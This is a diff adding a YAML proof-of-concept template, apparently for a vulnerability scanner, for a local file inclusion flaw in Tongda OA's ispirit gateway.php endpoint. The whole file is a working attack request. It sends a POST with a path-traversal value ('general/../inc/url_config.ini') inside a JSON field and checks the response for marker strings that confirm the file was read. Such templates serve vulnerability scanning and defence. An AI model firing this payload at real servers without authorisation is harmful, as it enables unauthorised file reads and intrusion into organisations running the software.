@@ -1,0 +1,22 @@
+id: poc-yaml-todayoa-ispirt-lfi
+info:
+  name: Toda OA ispirit 本地文件包含漏洞
+  severity: high
+  tags:
+  - lfi
+  finger: Toda OA
+  osprey-id: vb_2020_0022
+requests:
+- method: POST
+  path: /ispirit/interface/gateway.php
+  headers:
+    Accept: '*/*'
+    Accept-Language: en
+    User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
+    Content-Type: application/x-www-form-urlencoded
+  data: 'P=&json={"data": "1","url":"general/../inc/url_config.ini"}'
+  expression: 'contains(body, "[ie-stand]") && contains(body, "/general/system/seal_manage/")
+
+    '
+variables: {}
+transport: http
